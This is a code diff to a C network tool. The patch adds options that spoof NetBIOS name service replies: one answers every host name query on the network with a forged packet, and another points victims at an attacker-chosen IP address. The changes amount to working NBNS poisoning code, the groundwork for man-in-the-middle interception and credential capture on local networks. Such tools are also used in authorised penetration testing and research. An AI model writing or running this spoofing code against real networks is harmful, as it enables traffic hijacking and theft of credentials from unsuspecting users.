@@ -329,8 +329,33 @@ int name_mangle (char *In, char *Out, char name_type)
 	return (name_len (Out));
 }
 
+
+/* Converts a NetBIOs-encoded hostname into a readable string.
+ * The 'out' parameter should be at least strlen(in) + 1 chars long. */
+void name_demangle(char *in, char *out) {
+  unsigned int i = 0;
+
+  for (i = 1; i < strlen(in) - 1; i++)
+    out[i - 1] = in[i] - 65;
+
+  for (i = 0; i < (strlen(in) - 2) / 2; i++)
+    out[ i ] = (out[ (i * 2) ] * 16) + out[ (i * 2) + 1 ];
+
+  out[ i ] = '\0';
+
+  for (i = i - 1; i > 0; i--) {
+    if (out[ i ] == 32)
+      out[ i ] = '\0';
+    else
+      break;
+  }
+
+  return;
+}
+
+
 /* Build the NBT DS NB response */
-void build_ns_nb_response(ns_nb_response *resp, unsigned short trans_id, unsigned char *IPaddr, char *name)
+void build_ns_nb_response(ns_nb_response *resp, unsigned short trans_id, unsigned char *IPaddr, char *name, char *spoofedIP)
 {
 	char mangled_name[34];
 
@@ -349,10 +374,11 @@ void build_ns_nb_response(ns_nb_response *resp, unsigned short trans_id, unsigne
 	strcpy(resp->name, mangled_name);
 	resp->ans_type = htons(0x20);	// type: NB
 	resp->ans_class = htons(1);		// class: inet
-	resp->ttl = htonl((unsigned long)(871663*rand()*30000/RAND_MAX));	// real-life TTL (x days, y hours, ...)
+	/*resp->ttl = htonl((unsigned long)(871663*rand()*30000/RAND_MAX));*/	// real-life TTL (x days, y hours, ...)
+	resp->ttl = htonl(30);
 	resp->length = htons(6);
 	resp->ans_flags = 0;
-	resp->IPaddr = inet_addr(IPaddr);
+	resp->IPaddr = inet_addr(spoofedIP);
 }
 
 /* Build a NBTSTAT response packet header */
@@ -771,6 +797,8 @@ void usage(char *name)
 	*/
 
 	printf("NetBIOS options:\n");
+        printf("  -a                      Spoof all host queries (incompatible with -D, -N)\n");
+	printf("  -S [spoofed IP]         Spoof host query replies with this IP.\n");
 	printf("  -D [Domain/Workgroup]   Target Domain/Workgroup (default: WORKGROUP)\n");
 	printf("  -N [names prefix]       Host names prefix (default: HOST)\n");
 	printf("  -f [file path]          Use a configuration file (default: none)\n");
@@ -784,6 +812,7 @@ void usage(char *name)
 	printf("\n");
 
 	printf("Example:\n");
+	printf("%s -a -S 192.168.10.10\n", name);
 	printf("%s -s 192.168.0.1 -d 192.168.0.255 -D NTDOM -N ALLYOURBASE -v\n", name);
 	printf ("\n");
 
@@ -810,14 +839,18 @@ int main(int argc,char *argv[])
 	char ipaddr[1000][15];
 	char users[1000][20];
 
+        int all_hosts_mode = 0;
 	int release_mode = 0;
 	int nbsvc = 0;
+        int domain_name_specified = 0;
+        int host_name_specified = 0;
 	ns_name_query ns_query;	// NetBIOS structures
 	ns_nb_response ns_nb_resp;
 	ns_nbtstat_response_hdr ns_nbtstat_resp_hdr;
 	ns_nbtstat_name nbtstat_name;
 	ns_nbtstat_response_end ns_nbtstat_resp_end;
 	ns_nb_release ns_release;
+	char spoofedIP[16];
 	char getbuf[512];
 	int getLen;
 	char tmpname[34];
@@ -829,6 +862,9 @@ int main(int argc,char *argv[])
 	long int i;
 	int numsvc;
 
+	memset(spoofedIP, 0, sizeof(spoofedIP));
+	strncpy(spoofedIP, send_sourceIP, sizeof(spoofedIP) - 1);
+
 	/* Init params */
 	domainname = (unsigned char*)malloc(sizeof(unsigned char)*15);
 	strcpy(domainname, "WORKGROUP");
@@ -838,7 +874,7 @@ int main(int argc,char *argv[])
 	strcpy(interactive_usr, "ADMINISTRATOR");
 
 	/* Get params */
-	while ((c = getopt (argc, argv, "s:d:D:N:f:r:vHh?")) != -1)
+	while ((c = getopt (argc, argv, "s:S:d:D:N:f:r:avHh?")) != -1)
     {
       switch (c)
         {
@@ -850,15 +886,23 @@ int main(int argc,char *argv[])
           targetIP = optarg;
           break;
         case 'D':
+          domain_name_specified = 1;
           strcpy(domainname, optarg); // Cut at 15 char ? Try yourself...
           break;
         case 'N':
+          host_name_specified = 1;
           strcpy(hostname, optarg); // Cut at 15 char ? Try yourself...
           break;
         case 'f':
 		  confpath = (unsigned char*)malloc(sizeof(unsigned char)*strlen(optarg));
 		  strcpy(confpath, optarg);
           conffile_mode = 1;
+          break;
+        case 'S':
+          strncpy(spoofedIP, optarg, sizeof(spoofedIP) - 1);
+          break;
+        case 'a':
+          all_hosts_mode = 1;
           break;
         case 'r':
           release_mode = 1;
@@ -877,6 +921,11 @@ int main(int argc,char *argv[])
           break;
         }
     }
+
+	if (all_hosts_mode && (domain_name_specified || host_name_specified)) {
+		showusage = 1;
+		fprintf(stderr, "\nError: -D or -N options cannot be used with -a!\n\n");
+	}
 
 	if (showusage)
 		usage(appname);
@@ -1072,8 +1121,15 @@ int main(int argc,char *argv[])
 		case 32:
 			resp_required = 0;
 
-			// Check if the name is in the config file
-			if (conffile_mode) {
+			if (all_hosts_mode) {  // If we're supposed to spoof all hostnames.
+				resp_required = 1;
+
+				char *temp = (char *)calloc(strlen(ns_query.name) + 1, sizeof(char));
+				strncpy(temp, ns_query.name, (strlen(ns_query.name) + 1) * sizeof(char));
+				name_demangle(temp, hostname);
+				free(temp); temp = NULL;
+
+			} else if (conffile_mode) {  // Check if the name is in the config file
 				for (i=0; i<line_count; i++) {
 					name_mangle(hosts[i], tmpname, 0x00);
 					if (strncmp(tmpname, ns_query.name, 31) == 0) {
@@ -1093,7 +1149,7 @@ int main(int argc,char *argv[])
 			}
 
 			if (resp_required) {
-				build_ns_nb_response(&ns_nb_resp, htons(ns_query.trans_id), send_sourceIP, hostname);
+				build_ns_nb_response(&ns_nb_resp, htons(ns_query.trans_id), send_sourceIP, hostname, spoofedIP);
 
 				memcpy(sendbuf,&ns_nb_resp,sizeof(ns_nb_resp));
 				bufLen = sizeof(ns_nb_resp);
@@ -1114,7 +1170,8 @@ int main(int argc,char *argv[])
 					fprintf(stdout, "%c", sendbuf[i]);
 			}
 			else {
-				printf("Responding for host '%s' \n", hostname);
+				if (verbose_on)
+					printf("Responding for host '%s' \n", hostname);
 				send_raw_ip_udp(resolve(send_sourceIP), 137, resolve(targetIP), 137, sendbuf, bufLen);
 				if (verbose_on) {
 					printf("Bytes sent [%d]:\n", bufLen);
